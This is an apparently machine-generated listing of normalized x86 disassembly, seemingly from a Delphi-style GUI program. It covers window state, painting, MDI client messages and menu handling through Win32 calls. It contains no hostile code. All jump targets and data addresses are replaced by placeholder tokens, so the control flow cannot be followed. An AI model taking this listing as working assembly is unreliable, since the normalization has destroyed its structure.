call sub_45655c
mov ecx edi
mov edx esi
mov eax ebx
call sub_44442c
mov eax ebx
call sub_457388
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_41c9ac
push eax
call sub_406118
mov edx eax
mov eax ebp
call sub_41c9c8
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_43db94
mov ebp eax
push edi
push esi
mov eax ebx
call sub_43db50
push eax
call sub_406118
mov edx eax
mov eax ebx
call sub_457630
push edi
push esi
push ebp
call sub_406118
mov edx eax
mov eax ebx
call sub_457660
sub_45732c
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_444968
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_444c6c
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_45968c
push eax
push 0x1
push 0x80
mov eax ebx
call sub_444968
push eax
call SendMessageA
pop ebx
retn
sub_4573c0
push ebx
mov ebx eax
mov eax ebx
call sub_4582dc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_457454
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_444968
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_444a30
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_444968
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_444968
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_4574dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_444f0c
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_419a50
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_419a24
mov edi eax
mov eax edi
mov si 0xfff1
call sub_40348c
test al al
jne r-xdata
sub_457548
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_4031d8
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_457574
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax ebp
call sub_441698
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_419a50
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_444f54
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_419a24
mov si 0xfff1
call sub_40348c
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_419a60
jmp r-xdata
sub_457608
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_43e334
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43f334
sub_457630
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_43db68
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_457660
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_43dbac
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_457690
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_43e06c
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_4587c8
pop esi
pop ebx
retn
sub_4576d4
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_45772d
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457734
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
sub_45773c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_43e020
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_441ec0
mov eax ebx
call sub_44205c
sub_457774
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_41989c
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_4577b4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44237c
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_40348c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_40348c
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_43f334
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_43f334
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_43f334
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_43f334
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_43f334
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_43f334
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_4518d8
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4580e0
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d064
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_457a2d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_457a10
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41d800
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41d67c
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_452dc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457a17
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41d800
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_4518d8
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4580e0
call sub_444968
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_457b5b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d064
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_457b34
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_457b17
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41d800
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41d67c
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457b1e
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41d800
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_444968
mov esi eax
sub_457b3b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call ReleaseDC
retn
sub_457bec
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_457c38
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_458114
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_458160
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_457c78
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_457e46
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41cf48
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44261c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_43dc90
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43ca88
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_457bec
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41cf48
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_458114
test eax eax
je r-xdata
push ebp
call sub_457bec
pop ecx
push ebp
call sub_457bec
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_457c38
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_454f58
jmp r-xdata
sub_457e58
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_456120
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_457ec4
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_4567bc
mov eax ebx
call sub_444c6c
test al al
je r-xdata
mov eax ebx
call sub_419a50
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_444968
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_44178c
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_444968
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_419a24
call sub_45241c
mov edx esi
mov eax ebx
call sub_419a24
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
sub_457f5c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_457fd9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_457fe4
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_441f08
sub_458010
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_441f08
xor edx edx
jmp r-xdata
mov eax esi
call sub_45629c
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_458048
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_43d950
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_441f08
sub_45808c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_43da5c
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_4580e0
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_43afd8
sub_458114
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_45bc84
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_45bc70
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_458160
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_45bc84
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45bc70
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_4581b0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_413918
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_4581e0
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_444968
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_45bc54
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_45bc54
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_4581b0
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_45bc54
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45bc40
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_413a74
call sub_403290
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45bc40
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45bc40
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45bc40
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_4582e4
push ebx
mov ebx eax
mov eax ebx
call sub_4582dc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_423108
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_45830c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_441ec0
mov dl 0x1
mov eax esi
call sub_458670
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_4586ec
mov edx eax
mov eax esi
call sub_43e2ec
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_44205c
mov dl 0x1
mov eax esi
call sub_457690
sub_45838c
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_444968
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_44ea18
mov edi eax
mov eax ebp
call sub_444968
push eax
call DrawMenuBar
sub_458408
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_4194fc
xor edx edx
mov eax ebx
call sub_4503b0
sub_45842c
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_45838c
mov eax edx
mov edx ebx
call sub_4194fc
sub_458454
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45861a
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_45bc84
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_451f64
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45bc70
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_4194fc
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45bc70
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x10 ]
